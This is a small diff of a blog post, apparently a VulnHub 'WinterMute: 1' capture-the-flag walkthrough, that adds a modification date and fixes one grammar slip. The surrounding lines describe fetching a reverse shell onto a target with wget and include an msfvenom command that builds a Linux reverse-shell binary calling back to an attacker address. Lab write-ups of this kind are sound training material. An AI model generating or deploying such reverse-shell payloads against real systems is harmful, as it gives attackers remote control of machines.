@@ -3,6 +3,7 @@ layout: post
 title: "WinterMute: 1 Walkthrough"
 subtitle: "Things aren't different. Things are things."
 date: 2018-09-17 11:59:47 +0000
+last_modified_at: 2018-09-17 12:25:32 +0000
 category: Walkthrough
 tags: [VulnHub, WinterMute]
 comments: true
@@ -279,7 +280,7 @@ Too bad, this version of `nc` doesn't support the `-e` option. And because we ar
 
 Well, we can always execute `wget` to pull a reverse shell straight to Neuromancer. I can set up a Python SimpleHTTPServer listening at `4321/tcp` on my attacking machine. And because of the port forwarding, any `wget` request executed on Neuromancer to Straylight at `4321/tcp` gets to me.
 
-`msfvenom` can generates the reverse shell like so.
+`msfvenom` can generate the reverse shell like so.
 
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.40.128 LPORT=4321 -f elf -o rev
